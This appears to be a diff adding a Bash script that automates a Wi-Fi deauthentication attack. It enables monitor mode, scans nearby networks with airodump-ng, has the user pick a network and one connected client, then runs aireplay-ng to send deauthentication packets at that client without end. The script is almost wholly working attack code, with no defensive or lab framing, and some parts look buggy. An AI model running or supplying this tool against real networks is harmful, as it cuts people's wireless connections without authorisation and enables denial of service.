@@ -1,0 +1,96 @@
+#!/bin/bash
+declare cardMonitor
+declare MACS
+trap ctrl_c INT
+
+function ctrl_c(){
+  airmon-ng stop ${networkcard}mon > /dev/null 2>&1
+  rm .captura* 2>/dev/null
+  rm .filtro* 2>/dev/null
+  echo [*]exit...
+  exit 0
+}
+
+function checkdependcies(){
+  dependecies=(aircrack-ng xterm) #array of necesary dependecies
+  
+  for program in "${dependecies[@]}";do
+    test -f /usr/bin/$program #checking dependecie is installed
+    
+      if [ "$(echo $?)" == "0" ];then
+        echo -e "[*] $program installed"
+      else
+        apt-get install $program -y /dev/null 2>&1
+      fi; sleep 1
+  done 
+}
+  
+function setnetworkCard (){
+  airmon-ng start $networkcard > /dev/null 2>&1
+  cardMonitor=${networkcard}mon
+}
+
+function scanNetworks (){
+  clear
+  echo -e "\n\t[*]Start scan..."
+  xterm -hold -e "timeout 15 airodump-ng -w .captura  $networkcard" & 
+  PIDairo=$!
+  sleep 17
+  kill -9 $PIDairo 
+  wait $PIDairo 2>/dev/null
+  echo -e "\n\t[*]Scan Finished"
+  sleep 1
+  clear
+  echo -e "\tBSSID\t\tCHANNEL\tESSID"
+  cat .captura-01.csv | grep -B 1000 "Station" | sed '$d;2d' | cut -d "," -f1,4,14 | tr "," "\t" > .captura-01.csv
+  cat .captura-01.csv
+  echo -ne "[*] Select ESSID: " && read vESSID
+  MAC=$(grep $vESSID .captura-01.csv | awk '{print $1}')
+  CHN=$(grep $vESSID .captura-01.csv | awk '{print $2}')
+  xterm -hold -e "timeout 20 airodump-ng --bssid $MAC -w .filtro --output-format csv $networkcard" &
+  PIDfiltro=$!
+  sleep 25
+  kill -9 $PIDfiltro
+  wait $PIDfiltro 2>/dev/null
+  declare -i cont=0
+  while read line ;do
+    MACS[$i]="$line"
+    ((i++))
+  done <<< "$(grep -A 100 "Station" .filtro-01.csv | sed '1d;$d' | cut -d "," -f1)"
+  clear 
+  echo -e "\t\t++++++++++++$vESSID ------> $MAC+++++++++++++\n"
+  for element in ${!MACS[@]};do
+    echo -e "[$element] ---> ${MACS[$element]}"
+  done
+  echo -ne "Select one MAC ADDRESS: " && read Index
+  mactoAttack=${MACS[Index]}
+  echo -e "The Attack is running"
+  echo -e "[!] Press ctrl+c to stop attack"
+  airmon-ng stop $networkcard > /dev/null
+  airmon-ng start $networkcard $CHN > /dev/null
+  aireplay-ng -0 0 -a $MAC -c $mactoAttack --ignore-negative-one $networkcard > /dev/null
+
+}
+
+if [ "$(id -u)" == "0" ];then
+    declare -i parameter=0; while getopts ":n:" arg; do
+      case $arg in 
+              n) networkcard=$OPTARG; let parameter+=1 ;;
+      esac
+    done
+
+    if [ $parameter -ne 1 ]; then
+      echo "No argument inserted"
+      echo "-n {Networkcard}"
+    else
+      checkdependcies
+      setnetworkCard
+      scanNetworks;
+      #filterNetwork;
+      rm .captura* 2>/dev/null;
+      rm .filtro* 2>/dev/null;
+      airmon-ng stop ${networkcard}mon > /dev/null 2>&1
+    fi
+else
+    echo -e "ERROR ---> No root permission" 
+fi
